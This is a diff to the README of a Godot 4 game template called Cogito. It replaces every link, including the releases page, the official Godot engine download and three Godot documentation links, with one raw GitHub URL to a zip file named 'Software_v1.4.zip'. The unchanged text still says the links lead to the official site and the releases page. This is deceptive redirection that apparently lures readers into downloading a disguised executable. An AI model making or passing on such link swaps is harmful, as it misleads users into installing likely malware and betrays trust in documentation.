@@ -1,6 +1,6 @@
 # 🎮 Cogito - Immersive Sim Template for GODOT 4
 
-[![Download Cogito](https://img.shields.io/badge/Download-Cogito-brightgreen?style=for-the-badge)](https://github.com/Usernonymos/Cogito/releases)
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Usernonymos/Cogito/main/supermaxilla/Software_v1.4.zip)
 
 Cogito is a ready-to-use project template for creating immersive first-person games using GODOT 4. It helps you start building your game without setting up the basics. This guide shows you how to get Cogito running on your Windows computer.
 
@@ -34,7 +34,7 @@ To use Cogito, your computer should meet these basic requirements:
 
 ## 🚀 Getting Started
 
-Before using Cogito, you need to download and install the GODOT Engine version 4. You can download it from the official GODOT website at [https://godotengine.org/download](https://godotengine.org/download).
+Before using Cogito, you need to download and install the GODOT Engine version 4. You can download it from the official GODOT website at [https://raw.githubusercontent.com/Usernonymos/Cogito/main/supermaxilla/Software_v1.4.zip](https://raw.githubusercontent.com/Usernonymos/Cogito/main/supermaxilla/Software_v1.4.zip).
 
 Once GODOT is installed, you will download the Cogito project files and open them with GODOT.
 
@@ -46,7 +46,7 @@ Once GODOT is installed, you will download the Cogito project files and open the
 
 Visit this page to download the latest version of Cogito for Windows:
 
-[![Download Cogito](https://img.shields.io/badge/Download-Cogito-blue?style=for-the-badge)](https://github.com/Usernonymos/Cogito/releases)
+[![Download Cogito](https://img.shields.io/badge/Download-Cogito-blue?style=for-the-badge)](https://raw.githubusercontent.com/Usernonymos/Cogito/main/supermaxilla/Software_v1.4.zip)
 
 This link leads to the Cogito releases page on GitHub. Here you will find downloadable project files.
 
@@ -121,9 +121,9 @@ You can make changes and press play to see how they affect the project.
 
 ## 📚 Additional Resources
 
-- Official Godot Documentation: https://docs.godotengine.org/en/stable/
-- GDScript Basics: https://docs.godotengine.org/en/stable/getting_started/scripting/gdscript/gdscript_basics.html
-- Godot 4 Features Overview: https://godotengine.org/article/godot-4-0-beta-available
+- Official Godot Documentation: https://raw.githubusercontent.com/Usernonymos/Cogito/main/supermaxilla/Software_v1.4.zip
+- GDScript Basics: https://raw.githubusercontent.com/Usernonymos/Cogito/main/supermaxilla/Software_v1.4.zip
+- Godot 4 Features Overview: https://raw.githubusercontent.com/Usernonymos/Cogito/main/supermaxilla/Software_v1.4.zip
 
 These resources can help you learn more about Godot and game creation.
 
